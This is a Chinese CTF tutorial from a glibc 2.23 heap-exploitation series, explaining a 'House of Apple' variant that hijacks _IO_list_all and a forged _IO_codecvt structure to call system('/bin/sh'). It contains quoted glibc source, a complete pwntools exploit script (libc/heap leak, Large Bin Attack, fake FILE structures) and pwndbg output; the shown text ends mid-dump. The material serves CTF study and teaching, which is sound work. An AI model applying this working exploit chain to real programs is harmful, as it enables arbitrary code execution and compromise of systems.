---
layout: post
title: 【pwn4heap】pwn4heap - glibc2.23其十
categories: pwn4heap
description: 深入解析 glibc2.23 Heap Technique
keywords: CTF, pwn4heap, glibc2.23
---

# pwn4heap - glibc2.23其十

在CTF竞赛体系中，pwn类题目因其直接关联底层系统安全机制，常被视为核心挑战方向。其中，堆利用技术涉及动态内存管理的复杂交互，是突破现代软件防御体系的关键路径之一。本系列聚焦于glibc 2.23环境下的堆漏洞利用方法，该版本因其广泛存在与典型性，成为相关研究的常见基础。通过系统分析与归纳，本系列整理出约43种利用技术，涵盖从基础结构破坏到高级组合利用的多种场景，旨在为后续学习、教学与实践提供结构化的参考。笔者期望借此推动该领域的技术积累与方法论沉淀，促进安全研究社区的交流与进步。


## 1. glibc2.23

### 1-37 house of apple其四

在glibc 2.24引入对`_IO_FILE_plus`虚表（vtable）的严格验证后，**House of Apple**利用技术的一种变体能够有效绕过该防护。其核心思想是，**将堆漏洞提供的任意地址写原语，与glibc内部一个合法的宽字符IO跳转表（`_IO_wfile_jumps`）相结合**，并通过伪造`_IO_codecvt`结构，构建一条能够通过安全检查的完整利用链。

整个利用过程可以系统地划分为以下三个逻辑阶段：

**第一阶段：建立利用基础——获取关键原语**
首要步骤是利用堆漏洞（如**Large Bin Attack**）获得一次**向任意地址写入可控数据**的能力。此原语的核心用途是劫持全局IO流链表，通常通过向关键全局变量`_IO_list_all`写入一个可控的堆地址来实现，这是启动后续所有操作的先决条件。

**第二阶段：构建恶意环境——伪造IO结构并劫持链表**
利用获得的写能力，执行以下核心操作：
1.  **劫持全局链表头**：将管理所有打开文件流的全局指针`_IO_list_all`修改为指向在堆上预先构造的伪造`_IO_FILE_plus`结构。
2.  **设置合法虚表以通过检查**：**（此技术的核心与绕过关键）** 在该伪造结构中，将其虚表（vtable）指针设置为glibc内部合法的 **`_IO_wfile_jumps`** 地址。由于此地址位于libc认可的合法vtable内存区域，因此能通过严格的范围验证。
3.  **布置完整的伪造数据结构**：精确设置伪造结构中的各个字段，以精确操控后续执行逻辑：
    *   将`_IO_FILE_plus`结构内的`_wide_data`指针指向一个可控的、伪造的`_IO_wide_data`结构，以通过相关检查。
    *   **关键步骤**：将`_IO_FILE_plus`结构内的`_codecvt`指针指向一个可控的、伪造的`_IO_codecvt`结构。在该伪造的`_IO_codecvt`结构中：
        *   将`__codecvt_do_in`函数指针设置为目标函数地址（如`system`或`one_gadget`）。
        *   将`__codecvt_destr`指针设置为字符串`“/bin/sh”`，为`system`调用提供参数。
    *   将`_IO_FILE_plus`结构中的`_flags`字段设置为特定值（例如`0xFFFFFFFFFFFFFFEB`），用以满足后续执行路径中的各项状态检查。

**第三阶段：触发利用链——引导IO处理流程执行代码**
最终，当程序因调用`abort()`、`exit()`或因错误处理（如`malloc_printerr`）而触发`_IO_flush_all_lockp`函数时，该函数会遍历被污染的IO链表。对于链表中伪造的文件流，其`_IO_OVERFLOW`函数指针实际指向`_IO_wfile_jumps`表中的 **`_IO_wfile_underflow`**函数。

控制流进入`_IO_wfile_underflow`后，在特定的执行路径中，会调用`_codecvt`结构中的函数指针，具体为 **`(*cd->__codecvt_do_in) (cd, ...)`**。由于此前已完全控制该`_IO_codecvt`结构，此调用即跳转到预设的`system`函数，并以`__codecvt_destr`指向的`“/bin/sh”`作为参数，从而最终实现任意代码执行，获取shell。

相关glibc完整源码参见[wfileops.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/wfileops.c#L157)：

```c
const struct _IO_jump_t _IO_wfile_jumps =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
libc_hidden_data_def (_IO_wfile_jumps)

struct _IO_codecvt
{
  void (*__codecvt_destr) (struct _IO_codecvt *);
  enum __codecvt_result (*__codecvt_do_out) (struct _IO_codecvt *,
					     __mbstate_t *,
					     const wchar_t *,
					     const wchar_t *,
					     const wchar_t **, char *,
					     char *, char **);
  enum __codecvt_result (*__codecvt_do_unshift) (struct _IO_codecvt *,
						 __mbstate_t *, char *,
						 char *, char **);
  enum __codecvt_result (*__codecvt_do_in) (struct _IO_codecvt *,
					    __mbstate_t *,
					    const char *, const char *,
					    const char **, wchar_t *,
					    wchar_t *, wchar_t **);
  int (*__codecvt_do_encoding) (struct _IO_codecvt *);
  int (*__codecvt_do_always_noconv) (struct _IO_codecvt *);
  int (*__codecvt_do_length) (struct _IO_codecvt *, __mbstate_t *,
			      const char *, const char *, _IO_size_t);
  int (*__codecvt_do_max_length) (struct _IO_codecvt *);

  _IO_iconv_t __cd_in;
  _IO_iconv_t __cd_out;
};

struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of
				   backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};

wint_t
_IO_wfile_underflow (_IO_FILE *fp)
{
  struct _IO_codecvt *cd;
  enum __codecvt_result status;
  _IO_ssize_t count;

  if (__glibc_unlikely (fp->_flags & _IO_NO_READS))
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
    return *fp->_wide_data->_IO_read_ptr;

  cd = fp->_codecvt;

  /* Maybe there is something left in the external buffer.  */
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    {
      /* There is more in the external.  Convert it.  */
      const char *read_stop = (const char *) fp->_IO_read_ptr;

      fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;
      fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =
	fp->_wide_data->_IO_buf_base;
      status = (*cd->__codecvt_do_in) (cd, &fp->_wide_data->_IO_state,
				       fp->_IO_read_ptr, fp->_IO_read_end,
				       &read_stop,
				       fp->_wide_data->_IO_read_ptr,
				       fp->_wide_data->_IO_buf_end,
				       &fp->_wide_data->_IO_read_end);

      fp->_IO_read_base = fp->_IO_read_ptr;
      fp->_IO_read_ptr = (char *) read_stop;

      /* If we managed to generate some text return the next character.  */
      if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
	return *fp->_wide_data->_IO_read_ptr;

      if (status == __codecvt_error)
	{
	  __set_errno (EILSEQ);
	  fp->_flags |= _IO_ERR_SEEN;
	  return WEOF;
	}

      /* Move the remaining content of the read buffer to the beginning.  */
      memmove (fp->_IO_buf_base, fp->_IO_read_ptr,
	       fp->_IO_read_end - fp->_IO_read_ptr);
      fp->_IO_read_end = (fp->_IO_buf_base
			  + (fp->_IO_read_end - fp->_IO_read_ptr));
      fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
    }
  else
    fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_read_end =
      fp->_IO_buf_base;

  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
	{
	  free (fp->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_doallocbuf (fp);

      fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_read_end =
	fp->_IO_buf_base;
    }

  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end =
    fp->_IO_buf_base;

  if (fp->_wide_data->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_wide_data->_IO_save_base != NULL)
	{
	  free (fp->_wide_data->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_wdoallocbuf (fp);
    }

  /* Flush all line buffered files before reading. */
  /* FIXME This can/should be moved to genops ?? */
  if (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
    {
#if 0
      _IO_flush_all_linebuffered ();
#else
      /* We used to flush all line-buffered stream.  This really isn't
	 required by any standard.  My recollection is that
	 traditional Unix systems did this for stdout.  stderr better
	 not be line buffered.  So we do just that here
	 explicitly.  --drepper */
      _IO_acquire_lock (_IO_stdout);

      if ((_IO_stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
	  == (_IO_LINKED | _IO_LINE_BUF))
	_IO_OVERFLOW (_IO_stdout, EOF);

      _IO_release_lock (_IO_stdout);
#endif
    }

  _IO_switch_to_get_mode (fp);

  fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =
    fp->_wide_data->_IO_buf_base;
  fp->_wide_data->_IO_read_end = fp->_wide_data->_IO_buf_base;
  fp->_wide_data->_IO_write_base = fp->_wide_data->_IO_write_ptr =
    fp->_wide_data->_IO_write_end = fp->_wide_data->_IO_buf_base;

  const char *read_ptr_copy;
  char accbuf[MB_LEN_MAX];
  size_t naccbuf = 0;
 again:
  count = _IO_SYSREAD (fp, fp->_IO_read_end,
		       fp->_IO_buf_end - fp->_IO_read_end);
  if (count <= 0)
    {
      if (count == 0 && naccbuf == 0)
	{
	  fp->_flags |= _IO_EOF_SEEN;
	  fp->_offset = _IO_pos_BAD;
	}
      else
	fp->_flags |= _IO_ERR_SEEN, count = 0;
    }
  fp->_IO_read_end += count;
  if (count == 0)
    {
      if (naccbuf != 0)
	/* There are some bytes in the external buffer but they don't
	   convert to anything.  */
	__set_errno (EILSEQ);
      return WEOF;
    }
  if (fp->_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp->_offset, count);

  /* Now convert the read input.  */
  fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;
  fp->_IO_read_base = fp->_IO_read_ptr;
  const char *from = fp->_IO_read_ptr;
  const char *to = fp->_IO_read_end;
  size_t to_copy = count;
  if (__glibc_unlikely (naccbuf != 0))
    {
      to_copy = MIN (sizeof (accbuf) - naccbuf, count);
      to = __mempcpy (&accbuf[naccbuf], from, to_copy);
      naccbuf += to_copy;
      from = accbuf;
    }
  status = (*cd->__codecvt_do_in) (cd, &fp->_wide_data->_IO_state,
				   from, to, &read_ptr_copy,
				   fp->_wide_data->_IO_read_end,
				   fp->_wide_data->_IO_buf_end,
				   &fp->_wide_data->_IO_read_end);

  if (__glibc_unlikely (naccbuf != 0))
    fp->_IO_read_ptr += MAX (0, read_ptr_copy - &accbuf[naccbuf - to_copy]);
  else
    fp->_IO_read_ptr = (char *) read_ptr_copy;
  if (fp->_wide_data->_IO_read_end == fp->_wide_data->_IO_buf_base)
    {
      if (status == __codecvt_error)
	{
	out_eilseq:
	  __set_errno (EILSEQ);
	  fp->_flags |= _IO_ERR_SEEN;
	  return WEOF;
	}

      /* The read bytes make no complete character.  Try reading again.  */
      assert (status == __codecvt_partial);

      if (naccbuf == 0)
	{
	  if (fp->_IO_read_base < fp->_IO_read_ptr)
	    {
	      /* Partially used the buffer for some input data that
		 produces no output.  */
	      size_t avail = fp->_IO_read_end - fp->_IO_read_ptr;
	      memmove (fp->_IO_read_base, fp->_IO_read_ptr, avail);
	      fp->_IO_read_ptr = fp->_IO_read_base;
	      fp->_IO_read_end -= avail;
	      goto again;
	    }
	  naccbuf = fp->_IO_read_end - fp->_IO_read_ptr;
	  if (naccbuf >= sizeof (accbuf))
	    goto out_eilseq;

	  memcpy (accbuf, fp->_IO_read_ptr, naccbuf);
	}
      else
	{
	  size_t used = read_ptr_copy - accbuf;
	  if (used > 0)
	    {
	      memmove (accbuf, read_ptr_copy, naccbuf - used);
	      naccbuf -= used;
	    }

	  if (naccbuf == sizeof (accbuf))
	    goto out_eilseq;
	}

      fp->_IO_read_ptr = fp->_IO_read_end = fp->_IO_read_base;

      goto again;
    }

  return *fp->_wide_data->_IO_read_ptr;
}
libc_hidden_def (_IO_wfile_underflow)
```

本方法的成功执行最终依赖于glibc内部一条确定的、从堆错误处理到IO流刷新的路径。具体而言，通过触发堆分配器错误（例如双重释放一个已位于large bin中的块）来引导程序调用 **`malloc_printerr`** 函数。该函数在处理错误时，会调用 **`_IO_flush_all_lockp`** 以强制刷新所有已注册的IO流缓冲区。

`_IO_flush_all_lockp` 函数会遍历由全局指针 `_IO_list_all` 管理的IO链表，并对其中每个文件流调用其虚表（vtable）中定义的 **`_IO_OVERFLOW`** 函数。由于利用链已事先将伪造的 `_IO_FILE_plus` 结构插入此链表，并将其虚表设置为 **`_IO_wfile_jumps`**，因此实际被调用的 `_IO_OVERFLOW` 实现即为该表中的 **`_IO_wfile_underflow`** 函数。

**关键函数路径分析：**

1.  **`_IO_wfile_underflow` 函数**：
    *   **作用**：这是`_IO_wfile_jumps`虚表中`_IO_OVERFLOW`项所指向的函数，主要负责处理宽字符文件流在读取时缓冲区为空的“下溢”情况。
    *   **在利用中的角色**：该函数在执行过程中，会检查文件流关联的`_codecvt`结构。在正常的宽字符转换流程中，它会调用`_codecvt`结构中的转换函数。具体而言，它会通过`_IO_codecvt`结构中的 **`__codecvt_do_in`** 函数指针来执行字符集转换操作。

2.  **`__codecvt_do_in` 函数指针**：
    *   **作用**：这是`_IO_codecvt`结构体中的一个标准函数指针，本意是用于执行从外部多字节字符到内部宽字符的转换。
    *   **在利用中的角色**：**这是整个利用链的终点与核心跳转点**。通过前期布局，已完全控制了伪造的`_IO_codecvt`结构，并将此 **`__codecvt_do_in`** 指针设置为目标函数地址（如`system`）。同时，将同一结构中的`__codecvt_destr`指针设置为字符串`“/bin/sh”`。当`_IO_wfile_underflow`执行到转换步骤，调用`(*cd->__codecvt_do_in) (cd, ...)`时，实际调用的是`system`函数，并且`cd`（即伪造的`_IO_codecvt`结构地址）会作为第一个参数传递给`system`。由于此前将`__codecvt_destr`布置为`“/bin/sh”`，而`cd`指针指向的结构起始位置附近就包含此字符串指针，因此能够成功执行`system(“/bin/sh”)`。

**完整的控制流路径总结**：
因此，从触发错误到执行任意代码的完整控制流路径为：
**`malloc_printerr` → `_IO_flush_all_lockp` → `_IO_OVERFLOW` (`_IO_wfile_underflow`) → `__codecvt_do_in` → 可控的函数（如`system`）**。

通过将`_IO_codecvt`结构中的`__codecvt_do_in`函数指针指向预定目标，并将`__codecvt_destr`设置为命令字符串地址，最终将一次复杂的IO流刷新操作，转化为了对任意命令的可靠执行。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/14/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_apple_four/exploit.py)。

核心利用代码如下：

```python
# house of apple four
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
log.info(f"libc base: {hex(libc.address)}")
system = libc.sym["system"]
log.info(f"system addr: {hex(system)}")
_IO_wfile_jumps = libc.sym["_IO_wfile_jumps"]
log.info(f"_IO_wfile_jumps addr: {hex(_IO_wfile_jumps)}")
_IO_list_all = libc.sym["_IO_list_all"]
log.info(f"_IO_list_all addr: {hex(_IO_list_all)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 6].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(_IO_list_all - 0x10)
payload += p64(chunk0_addr) + p64(_IO_list_all - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)

# pwndbg> p/x (uint64_t)~(0x4 | 0x10)
# $1 = 0xffffffffffffffeb
# pwndbg>
payload = b"\x00" * 0x500 + p64(0xFFFFFFFFFFFFFFEB)
edit(1, len(payload), payload)

fake_wide_data = p64(3) + p64(2)
payload = b"\x00" * 0x20 + fake_wide_data
fake_codecvt = b"/bin/sh\x00"
fake_codecvt = fake_codecvt.ljust(0x18, b"\x00") + p64(system)
payload = payload.ljust(0x200 - 0x10, b"\x00") + fake_codecvt
edit(0, len(payload), payload)

fake_io = p64(0xFFFFFFFFFFFFFFFF)
fake_io = fake_io.ljust(0x20 - 0x10, b"\x00") + p64(2)
fake_io = fake_io.ljust(0x28 - 0x10, b"\x00") + p64(3)
fake_io = fake_io.ljust(0x98 - 0x10, b"\x00") + p64(chunk0_addr + 0x200)
fake_io = fake_io.ljust(0xA0 - 0x10, b"\x00") + p64(chunk0_addr + 0x30)
fake_io = fake_io.ljust(0xC0 - 0x10) + p64(0)
fake_io = fake_io.ljust(0xD8 - 0x10, b"\x00") + p64(_IO_wfile_jumps + 0x8)
edit(2, len(fake_io), fake_io)
delete(0)
conn.recvline()
cmd = b"cat src/2.23/house_of_apple_four/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在堆漏洞利用的起始阶段，获取目标进程的准确内存布局是成功的关键前提。一种广泛使用的技术是诱导一个空闲堆块在glibc分配器的不同容器间移动，利用其元数据的变化来提取地址信息。具体而言，通过安排一个堆块从**unsorted bin**迁移到**large bin**，可以借助large bin特殊的指针结构，同时泄露**libc的基地址**和**堆区域的起始地址**。

**完整的操作步骤与原理如下：**

1.  **初始化内存布局**
    程序首先连续分配三个堆内存块，依次标记为`chunk[0]`、`chunk[1]`和`chunk[2]`。其中`chunk[1]`扮演隔离者的角色，确保`chunk[0]`与`chunk[2]`在物理内存上不相邻，从而防止它们在未来操作中意外合并。一个至关重要的设定是使`chunk[0]`的大小大于`chunk[2]`的大小，这保证了`chunk[0]`的尺寸足够大，能够在后续步骤中被large bin接收（通常指大于等于1024字节）。

2.  **将块送入Unsorted Bin**
    接着，释放`chunk[0]`。由于它的尺寸超过了fast bin的阈值，并且没有与top chunk接壤，它会被放入**unsorted bin**——一个用于临时存放空闲块的双向循环链表。此时，分配器会将`chunk[0]`的`fd`（前向）和`bk`（后向）指针改写，指向glibc的`main_arena`管理结构内部的某个特定位置（例如`main_arena+88`）。这个地址与libc库的加载基址之间存在一个固定的、已知的偏移量。

3.  **引导块转移至Large Bin**
    随后，程序发起一次新的内存分配请求，申请一个大小为`chunk[3]`的块，并且要求`chunk[3]`的尺寸大于`chunk[0]`的尺寸。由于unsorted bin中唯一的块`chunk[0]`无法满足这个更大的请求，分配器会遍历unsorted bin。对于其中不匹配的块，会根据其大小进行整理。由于`chunk[0]`尺寸较大，它被从unsorted bin中移除，并依据其大小插入到对应的**large bin**链表中。

4.  **提取Large Bin中的双重地址信息**
    在large bin中，每个空闲块不仅维护着用于普通双向链表遍历的`fd`和`bk`指针，还额外包含一对`fd_nextsize`和`bk_nextsize`指针，用于在不同大小的块之间进行快速跳转。当`chunk[0]`被放入一个**空的large bin**，或者成为其所在尺寸范围内的 **第一个（或唯一一个）块**时，它的`fd_nextsize`和`bk_nextsize`指针会被初始化为指向其自身的堆内存地址。因此，此刻`chunk[0]`的元数据中同时保存了两种极具价值的信息：
    *   `fd`和`bk`：指向`main_arena`内部的地址，**与libc直接相关**。
    *   `fd_nextsize`和`bk_nextsize`：指向`chunk[0]`自身的地址，**即堆内存地址**。

5.  **读取并计算关键地址**
    最后，利用程序可能存在的展示功能（例如通过类似`show(0)`的函数）输出`chunk[0]`用户数据区的内容。因为该块当前处于释放状态，其用户数据区的起始部分已被上述管理指针覆盖。从输出结果中可以轻松解析出：
    *   从`fd`或`bk`的值，推算出`main_arena`的地址，减去已知的固定偏移即可得到**libc的基址**。
    *   从`fd_nextsize`或`bk_nextsize`的值，直接获得**该堆块所在的堆内存地址**。

通过这一系列精巧但模拟了正常内存管理行为的操作，无需任何初始信息，即可同时获取后续利用所依赖的两个核心地址：libc基址和堆布局地址，为实施更复杂的利用（如Large Bin Attack）奠定了坚实的基础。

```bash
pwndbg> heap
Free chunk (largebins) | PREV_INUSE
Addr: 0x5a4b9c546000
Size: 0x430 (with flag bits: 0x431)
fd: 0x7f1f7638df68
bk: 0x7f1f7638df68
fd_nextsize: 0x5a4b9c546000
bk_nextsize: 0x5a4b9c546000

Allocated chunk
Addr: 0x5a4b9c546430
Size: 0x510 (with flag bits: 0x510)

Allocated chunk | PREV_INUSE
Addr: 0x5a4b9c546940
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x5a4b9c546d50
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x5a4b9c547260
Size: 0x1fda0 (with flag bits: 0x1fda1)

pwndbg> largebins 
largebins
0x400-0x430: 0x5a4b9c546000 —▸ 0x7f1f7638df68 (main_arena+1096) ◂— 0x5a4b9c546000
pwndbg> 
```

在获取关键的libc与堆内存地址后，利用进入核心的构造阶段。接下来，将利用**Large Bin Attack**这一强大原语，在单次堆分配操作中实现 **两次独立的任意地址写**，从而为后续利用铺平道路。

**具体利用步骤如下：**

1.  **准备利用载体**：首先释放预留的`chunk[2]`。由于其尺寸适中，将被置入**unsorted bin**，作为后续链表操作中待转移的“受害者”块（victim）。

2.  **篡改Large Bin的链表指针**：利用已掌握的堆上任意写能力，修改仍位于**large bin**中的`chunk[0]`的关键元数据指针，将其指向利用目标：
    *   将`chunk[0]`的`bk`（后向）指针修改为`_IO_list_all - 0x10`，目标是劫持全局IO流链表头。
    *   将`chunk[0]`的`bk_nextsize`（大尺寸后向）指针修改为`target2`（例如`_IO_list_all - 0x20`或`global_max_fast`），用于向第二个目标地址写入。

3.  **通过分配触发双重写入**：程序申请一个较大的新堆块`chunk[4]`，其大小需同时大于`chunk[2]`和`chunk[0]`的尺寸。此条件迫使分配器无法直接使用现有空闲块，必须对unsorted bin进行整理。

    在整理过程中，分配器会将`chunk[2]`（victim）从unsorted bin中取出，并尝试按其大小插入`chunk[0]`所在的large bin链表。**此插入操作会触发分配器执行两次关键的链表维护写入**：
    *   **首次写入（劫持`_IO_list_all`）**：执行操作`victim->bk->fd = victim`。由于`victim->bk`已被篡改为`_IO_list_all - 0x10`，此操作实际效果是向 **`*_IO_list_all`** 写入`victim`（`chunk[2]`）的地址。
    *   **二次写入（污染辅助目标）**：执行操作`victim->bk_nextsize->fd_nextsize = victim`。由于`victim->bk_nextsize`指向`target2`，此操作向 **`*(target2 + 0x20)`** 写入了`victim`的地址。

**利用达成的效果**：
至此，一次精心布局的Large Bin Attack成功实现了双重效果：
1.  **核心劫持**：全局IO链表头指针`_IO_list_all`被成功劫持，指向可控的堆内存（`chunk[2]`），为后续伪造恶意IO结构并劫持控制流创造了决定性的条件。
2.  **辅助破坏**：在第二个可控目标地址（`target2 + 0x20`）写入了一个堆地址。通过灵活选择`target2`（如设为`global_max_fast`），可以进一步扰乱堆分配器的行为，为整个利用链提供额外的操作空间。

此步骤标志着从信息收集阶段，正式进入了主动篡改关键全局数据结构、构建恶意执行环境的实质性利用阶段。

```bash
pwndbg> x/1gx &_IO_list_all
0x7f1f7638e540 <__GI__IO_list_all>:     0x00005a4b9c546940
pwndbg> x/10gx chunks
0x5a4b667aa060 <chunks>:        0x0000000000000020      0x00005a4b9c546010
0x5a4b667aa070 <chunks+16>:     0x0000000000000500      0x00005a4b9c546440
0x5a4b667aa080 <chunks+32>:     0x0000000000000400      0x00005a4b9c546950
0x5a4b667aa090 <chunks+48>:     0x0000000000000500      0x00005a4b9c546d60
0x5a4b667aa0a0 <chunks+64>:     0x0000000000000500      0x00005a4b9c547270
pwndbg> 
```

在成功将全局指针`_IO_list_all`劫持为指向可控堆块`chunk[2]`后，利用流程进入核心的**数据构造阶段**。此时，需要在`chunk[2]`的内存中 **伪造一个完整的`_IO_FILE_plus`结构体**，此结构将作为引导后续IO处理流程执行任意代码的“导航器”，其每一个字段都必须精确设置以通过glibc严格的内部校验。

**伪造结构各核心字段的设置、目的与作用如下：**

1.  **`_flags`字段**：设置为`0xFFFFFFFFFFFFFFEB`。该值的比特模式经过特殊设计，**旨在清除`_IO_NO_READS`标志位**。这使得伪造的文件流能够顺利通过`_IO_wfile_underflow`等函数中的 `if (__glibc_unlikely (fp->_flags & _IO_NO_READS))` 检查，避免执行流被提前终止。

2.  **虚表（`vtable`）指针**：设置为glibc内部合法的符号地址——**`_IO_wfile_jumps`**。**这是绕过glibc 2.24版本引入的vtable范围检查的基石**。由于该地址位于libc内合法的虚表内存区间，因此能通过验证。此项设置使得对该文件流`_IO_OVERFLOW`的调用，实际会跳转到`_IO_wfile_jumps`表中的 **`_IO_wfile_underflow`** 函数，从而将控制流导入预设的宽字符处理路径。

3.  **`_wide_data`指针**：指向一个可控的内存地址，例如`chunk0_addr + 0x30`。其目的是在该地址构造一个伪造的`_IO_wide_data`结构，以满足内部函数对宽字符数据指针的基本非空检查，避免因空指针异常导致进程崩溃。

4.  **`_codecvt`指针**：**这是整个利用链的核心枢纽之一**。将此指针设置为`chunk0_addr + 0x200`，并在此地址精心布置一个伪造的`_IO_codecvt`结构。在该结构中，通过将 **`__codecvt_do_in`**函数指针项设置为最终的目标函数地址（如`system`），为最终的代码执行做好准备。

5.  **关键状态字段**：
    *   **`_mode`、`_IO_write_ptr`、`_IO_write_base`**：将`_mode`设为`0`，`_IO_write_ptr`设为`3`，`_IO_write_base`设为`2`。此组合旨在满足 **`_IO_flush_all_lockp`** 函数内部的关键条件：`if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) ...)`。通过使`_mode <= 0` 且 `_IO_write_ptr > _IO_write_base` 同时成立，可以确保该伪造文件流被识别为“需要刷新”，从而触发对其`_IO_OVERFLOW`（即`_IO_wfile_underflow`）的调用。
    *   **`_IO_read_end`**：将此字段设置为一个极大的值（如`0xffffffffffffffff`）。**其核心目的**在于，与`_IO_read_ptr`配合，使得`_IO_wfile_underflow`函数中的条件判断 `if (fp->_IO_read_ptr < fp->_IO_read_end)` **恒成立**。这将引导执行流进入特定的代码分支，最终触发对`_codecvt`结构中的 **`__codecvt_do_in`** 函数指针的调用，从而跳转到预设的`system`等函数。

**总结**：此步骤的本质，是在被劫持的IO链表起点（`chunk[2]`）上，构建一个能通过glibc层层安全检查的“合法”文件流外壳。通过精确设定状态标志绕过初步校验，指向合法虚表通过范围检查，并关键地将`_codecvt`指针指向一个完全可控的“数据中枢”（伪造的`_IO_codecvt`结构），同时利用`_IO_read_end`等字段操控内部执行路径，最终为触发`__codecvt_do_in`调用并执行任意代码，完成了全部必要的数据与指针准备。

```bash
pwndbg> p/x *(struct _IO_FILE_plus*)_IO_list_all
$1 = {
  file = {
    _flags = 0xffffffeb,
    _IO_read_ptr = 0x411,
    _IO_read_end = 0xffffffffffffffff,
    _IO_read_base = 0x0,
    _IO_write_base = 0x2,
    _IO_write_ptr = 0x3,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0x0,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x0,
    _offset = 0x0,
    _codecvt = 0x5a4b9c546200,
    _wide_data = 0x5a4b9c546030,
    _freeres_list = 0x2020202020202020,
    _freeres_buf = 0x2020202020202020,
    __pad5 = 0x2020202020202020,
    _mode = 0x0,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x7f1f7638c268
}
pwndbg> p/x *(struct _IO_jump_t*)0x7f1f7638c268
$2 = {
  __dummy = 0x0,
  __dummy2 = 0x7f1f7606c263,
  __finish = 0x7f1f76067587,
  __overflow = 0x7f1f76066561,
  __underflow = 0x7f1f760655fa,
  __uflow = 0x7f1f76065405,
  __pbackfail = 0x7f1f76067926,
  __xsputn = 0x7f1f7606bf4c,
  __xsgetn = 0x7f1f76066d64,
  __seekoff = 0x7f1f7606d997,
  __seekpos = 0x7f1f7606b2db,
  __setbuf = 0x7f1f760677e1,
  __sync = 0x7f1f76061d6f,
  __doallocate = 0x7f1f7606bbf9,
  __read = 0x7f1f7606bc56,
